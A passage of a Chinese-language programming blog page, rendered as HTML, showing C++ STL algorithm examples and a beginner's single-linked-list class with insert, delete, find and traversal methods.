class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   std::vector&lt;<span class="type">int</span>&gt; v = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line">   <span class="type">int</span> target = <span class="number">3</span>;</span><br><span class="line">   <span class="keyword">auto</span> it = std::<span class="built_in">find</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), target); <span class="comment">// 查找元素3</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (it != v.<span class="built_in">end</span>()) &#123;</span><br><span class="line">       std::cout &lt;&lt; <span class="string">&quot;Element found at position: &quot;</span> &lt;&lt; (it - v.<span class="built_in">begin</span>()) &lt;&lt; std::endl;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       std::cout &lt;&lt; <span class="string">&quot;Element not found&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>std::reverse</code>：反转容器中的元素顺序。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   std::vector&lt;<span class="type">int</span>&gt; v = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line">   std::<span class="built_in">reverse</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>()); <span class="comment">// 反转整个向量</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> i : v) &#123;</span><br><span class="line">       std::cout &lt;&lt; i &lt;&lt; <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   std::cout &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>std::max_element</code> 和 <code>std::min_element</code>：找到容器中的最大和最小元素。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   std::vector&lt;<span class="type">int</span>&gt; v = &#123;<span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">6</span>&#125;;</span><br><span class="line">   <span class="keyword">auto</span> max_it = std::<span class="built_in">max_element</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>()); <span class="comment">// 找到最大元素</span></span><br><span class="line">   <span class="keyword">auto</span> min_it = std::<span class="built_in">min_element</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>()); <span class="comment">// 找到最小元素</span></span><br><span class="line"></span><br><span class="line">   std::cout &lt;&lt; <span class="string">&quot;Max element: &quot;</span> &lt;&lt; *max_it &lt;&lt; std::endl;</span><br><span class="line">   std::cout &lt;&lt; <span class="string">&quot;Min element: &quot;</span> &lt;&lt; *min_it &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这些只是 <code>algorithm</code> 头文件中提供的众多算法的一小部分。使用这些算法可以大大简化对容器中元素的操作，提高代码的效率和可读性。</p><h3 id="链表-1"><a href="#链表-1" class="headerlink" title="链表"></a>链表</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br></pre></td><td class="code"><pre><span class="line">C++单链表的操作</span><br><span class="line"><span class="number">2017</span><span class="number">-12</span><span class="number">-25</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="comment">// 单链表.cpp: 定义控制台应用程序的入口点。</span></span><br><span class="line"> <span class="comment">//Author:kgvito </span></span><br><span class="line"> <span class="comment">//Date: 2017.12.25</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> <span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"> <span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"> using namespace <span class="built_in">std</span>;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">typedef</span> <span class="type">int</span> DataType;</span><br><span class="line"> <span class="meta">#<span class="keyword">define</span> Node ElemType</span></span><br><span class="line"> <span class="meta">#<span class="keyword">define</span> ERROR NULL</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment">//构建一个节点类</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Node</span>                          </span></span><br><span class="line"><span class="class"> &#123;</span></span><br><span class="line"> public:</span><br><span class="line">     <span class="type">int</span> data;     <span class="comment">//数据域</span></span><br><span class="line">     Node * next;  <span class="comment">//指针域</span></span><br><span class="line"> &#125;;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//构建一个单链表类</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">LinkList</span>                      </span></span><br><span class="line"><span class="class"> &#123;</span></span><br><span class="line"> public:</span><br><span class="line">     LinkList();                      <span class="comment">//构建一个单链表;</span></span><br><span class="line">     ~LinkList();                  <span class="comment">//销毁一个单链表;</span></span><br><span class="line">     <span class="type">void</span> <span class="title function_">CreateLinkList</span><span class="params">(<span class="type">int</span> n)</span>;   <span class="comment">//创建一个单链表</span></span><br><span class="line">     <span class="type">void</span> <span class="title function_">TravalLinkList</span><span class="params">()</span>;        <span class="comment">//遍历线性表</span></span><br><span class="line">     <span class="type">int</span> <span class="title function_">GetLength</span><span class="params">()</span>;              <span class="comment">//获取线性表长度</span></span><br><span class="line">     <span class="type">bool</span> <span class="title function_">IsEmpty</span><span class="params">()</span>;               <span class="comment">//判断单链表是否为空</span></span><br><span class="line">     ElemType * <span class="title function_">Find</span><span class="params">(DataType data)</span>; <span class="comment">//查找节点</span></span><br><span class="line">     <span class="type">void</span> <span class="title function_">InsertElemAtEnd</span><span class="params">(DataType data)</span>;            <span class="comment">//在尾部插入指定的元素</span></span><br><span class="line">     <span class="type">void</span> <span class="title function_">InsertElemAtIndex</span><span class="params">(DataType data,<span class="type">int</span> n)</span>;    <span class="comment">//在指定位置插入指定元素</span></span><br><span class="line">     <span class="type">void</span> <span class="title function_">InsertElemAtHead</span><span class="params">(DataType data)</span>;           <span class="comment">//在头部插入指定元素</span></span><br><span class="line">     <span class="type">void</span> <span class="title function_">DeleteElemAtEnd</span><span class="params">()</span>;       <span class="comment">//在尾部删除元素</span></span><br><span class="line">     <span class="type">void</span> <span class="title function_">DeleteAll</span><span class="params">()</span>;             <span class="comment">//删除所有数据</span></span><br><span class="line">     <span class="type">void</span> <span class="title function_">DeleteElemAtPoint</span><span class="params">(DataType data)</span>;     <span class="comment">//删除指定的数据</span></span><br><span class="line">     <span class="type">void</span> <span class="title function_">DeleteElemAtHead</span><span class="params">()</span>;      <span class="comment">//在头部删除节点</span></span><br><span class="line"> private:</span><br><span class="line">     ElemType * head;              <span class="comment">//头结点</span></span><br><span class="line"> &#125;;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//初始化单链表</span></span><br><span class="line"> LinkList::LinkList()                  </span><br><span class="line"> &#123;</span><br><span class="line">     head = new ElemType;            </span><br><span class="line">     head-&gt;data = <span class="number">0</span>;               <span class="comment">//将头结点的数据域定义为0</span></span><br><span class="line">     head-&gt;next = <span class="literal">NULL</span>;            <span class="comment">//头结点的下一个定义为NULL</span></span><br><span class="line"> &#125;     </span><br><span class="line"> </span><br><span class="line"> <span class="comment">//销毁单链表</span></span><br><span class="line"> LinkList::~LinkList()</span><br><span class="line"> &#123;</span><br><span class="line">     delete head;                 <span class="comment">//删除头结点</span></span><br><span class="line"> &#125; </span><br><span class="line"> </span><br><span class="line"> <span class="comment">//创建一个单链表</span></span><br><span class="line"> <span class="type">void</span> <span class="title function_">LinkList::CreateLinkList</span><span class="params">(<span class="type">int</span> n)</span></span><br><span class="line"> &#123;</span><br><span class="line">     ElemType *pnew, *ptemp;</span><br><span class="line">     ptemp = head;</span><br><span class="line">     <span class="keyword">if</span> (n &lt; <span class="number">0</span>) &#123;       <span class="comment">//当输入的值有误时，处理异常</span></span><br><span class="line">         <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;输入的节点个数有误&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">         <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n;i++) &#123;        <span class="comment">//将值一个一个插入单链表中</span></span><br><span class="line">         pnew = new ElemType;</span><br><span class="line">         <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入第&quot;</span> &lt;&lt; i + <span class="number">1</span> &lt;&lt; <span class="string">&quot;个值: &quot;</span> ;</span><br><span class="line">         <span class="built_in">cin</span> &gt;&gt; pnew-&gt;data;</span><br><span class="line">         pnew-&gt;next = <span class="literal">NULL</span>;          <span class="comment">//新节点的下一个地址为NULL</span></span><br><span class="line">         ptemp-&gt;next = pnew;         <span class="comment">//当前结点的下一个地址设为新节点</span></span><br><span class="line">         ptemp = pnew;               <span class="comment">//将当前结点设为新节点</span></span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//遍历单链表</span></span><br><span class="line"> <span class="type">void</span> <span class="title function_">LinkList::TravalLinkList</span><span class="params">()</span></span><br><span class="line"> &#123;</span><br><span class="line">     <span class="keyword">if</span> (head == <span class="literal">NULL</span> || head-&gt;next ==<span class="literal">NULL</span>) &#123;</span><br><span class="line">         <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;链表为空表&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     ElemType *p = head;                 <span class="comment">//另指针指向头结点</span></span><br><span class="line">     <span class="keyword">while</span> (p-&gt;next != <span class="literal">NULL</span>)        <span class="comment">//当指针的下一个地址不为空时，循环输出p的数据域</span></span><br><span class="line">     &#123;</span><br><span class="line">         p = p-&gt;next;               <span class="comment">//p指向p的下一个地址</span></span><br><span class="line">         <span class="built_in">cout</span> &lt;&lt; p-&gt;data &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//获取单链表的长度</span></span><br><span class="line"> <span class="type">int</span> <span class="title function_">LinkList::GetLength</span><span class="params">()</span></span><br><span class="line"> &#123;</span><br><span class="line">     <span class="type">int</span> count = <span class="number">0</span>;                  <span class="comment">//定义count计数</span></span><br><span class="line">     ElemType *p = head-&gt;next;           <span class="comment">//定义p指向头结点</span></span><br><span class="line">     <span class="keyword">while</span> (p != <span class="literal">NULL</span>)                <span class="comment">//当指针的下一个地址不为空时，count+1</span></span><br><span class="line">     &#123;</span><br><span class="line">         count++;                  </span><br><span class="line">         p = p-&gt;next;                <span class="comment">//p指向p的下一个地址</span></span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> count;                   <span class="comment">//返回count的数据</span></span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//判断单链表是否为空</span></span><br><span class="line"> <span class="type">bool</span> <span class="title function_">LinkList::IsEmpty</span><span class="params">()</span></span><br><span class="line"> &#123;</span><br><span class="line">     <span class="keyword">if</span> (head-&gt;next == <span class="literal">NULL</span>) &#123;                 </span><br><span class="line">         <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//查找节点</span></span><br><span class="line"> ElemType * <span class="title function_">LinkList::Find</span><span class="params">(DataType data)</span></span><br><span class="line"> &#123;</span><br><span class="line">     ElemType * p = head;</span><br><span class="line">     <span class="keyword">if</span> (p == <span class="literal">NULL</span>) &#123;                           <span class="comment">//当为空表时，报异常</span></span><br><span class="line">         <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;此链表为空链表&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">         <span class="keyword">return</span> ERROR;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">     &#123;</span><br><span class="line">         <span class="keyword">while</span> (p-&gt;next != <span class="literal">NULL</span>)               <span class="comment">//循环每一个节点</span></span><br><span class="line">         &#123;</span><br><span class="line">             <span class="keyword">if</span> (p-&gt;data == data) &#123;</span><br><span class="line">                 <span class="keyword">return</span> p;                     <span class="comment">//返回指针域</span></span><br><span class="line">             &#125;</span><br><span class="line">             p = p-&gt;next;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">NULL</span>;                           <span class="comment">//未查询到结果</span></span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//在尾部插入指定的元素</span></span><br><span class="line"> <span class="type">void</span> <span class="title function_">LinkList::InsertElemAtEnd</span><span class="params">(DataType data)</span></span><br><span class="line"> &#123;</span><br><span class="line">     ElemType * newNode = new ElemType;    <span class="comment">//定义一个Node结点指针newNode</span></span><br><span class="line">     newNode-&gt;next = <span class="literal">NULL</span>;         <span class="comment">//定义newNode的数据域和指针域</span></span><br><span class="line">     newNode-&gt;data = data;</span><br><span class="line">     ElemType * p = head;              <span class="comment">//定义指针p指向头结点</span></span><br><span class="line">     <span class="keyword">if</span> (head == <span class="literal">NULL</span>) &#123;           <span class="comment">//当头结点为空时，设置newNode为头结点</span></span><br><span class="line">         head = newNode;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span>                          <span class="comment">//循环知道最后一个节点，将newNode放置在最后</span></span><br><span class="line">     &#123;</span><br><span class="line">         <span class="keyword">while</span> (p-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">         &#123;</span><br><span class="line">             p = p-&gt;next;</span><br><span class="line">         &#125;</span><br><span class="line">         p-&gt;next = newNode;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//在指定位置插入指定元素</span></span><br><span class="line"> <span class="type">void</span> <span class="title function_">LinkList::InsertElemAtIndex</span><span class="params">(DataType data,<span class="type">int</span> n)</span></span><br><span class="line"> &#123;</span><br><span class="line">     <span class="keyword">if</span> (n&lt;<span class="number">1</span> || n&gt;GetLength())                   <span class="comment">//输入有误报异常</span></span><br><span class="line">         <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;输入的值错误&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">     &#123;</span><br><span class="line">         ElemType * ptemp = new ElemType;        <span class="comment">//创建一个新的节点</span></span><br><span class="line">         ptemp-&gt;data = data;                     <span class="comment">//定义数据域</span></span><br><span class="line">         ElemType * p = head;                    <span class="comment">//创建一个指针指向头结点</span></span><br><span class="line">         <span class="type">int</span> i = <span class="number">1</span>;</span><br><span class="line">         <span class="keyword">while</span> (n &gt; i)                           <span class="comment">//遍历到指定的位置</span></span><br><span class="line">         &#123;</span><br><span class="line">             p = p-&gt;next;</span><br><span class="line">             i++;</span><br><span class="line">         &#125;</span><br><span class="line">         ptemp-&gt;next = p-&gt;next;                 <span class="comment">//将新节点插入到指定位置</span></span><br><span class="line">         p-&gt;next = ptemp;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//在头部插入指定元素</span></span><br><span class="line"> <span class="type">void</span> <span class="title function_">LinkList::InsertElemAtHead</span><span class="params">(DataType data)</span></span><br><span class="line"> &#123;</span><br><span class="line">     ElemType * newNode = new ElemType;    <span class="comment">//定义一个Node结点指针newNode</span></span><br><span class="line">     newNode-&gt;data = data;</span><br><span class="line">     ElemType * p = head;              <span class="comment">//定义指针p指向头结点</span></span><br><span class="line">     <span class="keyword">if</span> (head == <span class="literal">NULL</span>) &#123;           <span class="comment">//当头结点为空时，设置newNode为头结点</span></span><br><span class="line">         head = newNode;</span><br><span class="line">     &#125;</span><br><span class="line">     newNode-&gt;next = p-&gt;next;          <span class="comment">//将新节点插入到指定位置</span></span><br><span class="line">     p-&gt;next = newNode;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//在尾部删除元素</span></span><br><span class="line"> <span class="type">void</span> <span class="title function_">LinkList::DeleteElemAtEnd</span><span class="params">()</span></span><br><span class="line"> &#123;</span><br><span class="line">     ElemType * p = head;          <span class="comment">//创建一个指针指向头结点</span></span><br><span class="line">     ElemType * ptemp = <span class="literal">NULL</span>;      <span class="comment">//创建一个占位节点</span></span><br><span class="line">     <span class="keyword">if</span> (p-&gt;next == <span class="literal">NULL</span>) &#123;        <span class="comment">//判断链表是否为空</span></span><br><span class="line">         <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;单链表空&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">     &#123;</span><br><span class="line">         <span class="keyword">while</span> (p-&gt;next != <span class="literal">NULL</span>)   <span class="comment">//循环到尾部的前一个</span></span><br><span class="line">         &#123;</span><br><span class="line">             ptemp = p;            <span class="comment">//将ptemp指向尾部的前一个节点</span></span><br><span class="line">             p = p-&gt;next;          <span class="comment">//p指向最后一个节点</span></span><br><span class="line">         &#125;</span><br><span class="line">         delete p;                <span class="comment">//删除尾部节点</span></span><br><span class="line">         p = <span class="literal">NULL</span>;</span><br><span class="line">         ptemp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//删除所有数据</span></span><br><span class="line"> <span class="type">void</span> <span class="title function_">LinkList::DeleteAll</span><span class="params">()</span></span><br><span class="line"> &#123;</span><br><span class="line">     ElemType * p = head-&gt;next;</span><br><span class="line">     ElemType * ptemp = new ElemType;</span><br><span class="line">     <span class="keyword">while</span> (p != <span class="literal">NULL</span>)                    <span class="comment">//在头结点的下一个节点逐个删除节点</span></span><br><span class="line">     &#123;</span><br><span class="line">         ptemp = p;</span><br><span class="line">         p = p-&gt;next;</span><br><span class="line">         head-&gt;next = p;</span><br><span class="line">         ptemp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">         delete ptemp;</span><br><span class="line">     &#125;</span><br><span class="line">     head-&gt;next = <span class="literal">NULL</span>;                 <span class="comment">//头结点的下一个节点指向NULL</span></span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//删除指定的数据</span></span><br><span class="line"> <span class="type">void</span> <span class="title function_">LinkList::DeleteElemAtPoint</span><span class="params">(DataType data)</span></span><br><span class="line"> &#123;</span><br><span class="line">     ElemType * ptemp = Find(data);    <span class="comment">//查找到指定数据的节点位置</span></span><br><span class="line">     <span class="keyword">if</span> (ptemp == head-&gt;next) &#123;        <span class="comment">//判断是不是头结点的下一个节点，如果是就从头部删了它</span></span><br><span class="line">         DeleteElemAtHead();</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">     &#123;</span><br><span class="line">         ElemType * p = head;          <span class="comment">//p指向头结点</span></span><br><span class="line">         <span class="keyword">while</span> (p-&gt;next != ptemp)      <span class="comment">//p循环到指定位置的前一个节点</span></span><br><span class="line">         &#123;</span><br><span class="line">             p = p-&gt;next;</span><br><span class="line">         &#125;</span><br><span class="line">         p-&gt;next = ptemp-&gt;next;         <span class="comment">//删除指定位置的节点</span></span><br><span class="line">         delete ptemp;</span><br><span class="line">         ptemp = <span class="literal">NULL</span>;               </span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//在头部删除节点</span></span><br><span class="line"> <span class="type">void</span> <span class="title function_">LinkList::DeleteElemAtHead</span><span class="params">()</span></span><br><span class="line"> &#123;</span><br><span class="line">     ElemType * p = head;</span><br><span class="line">     <span 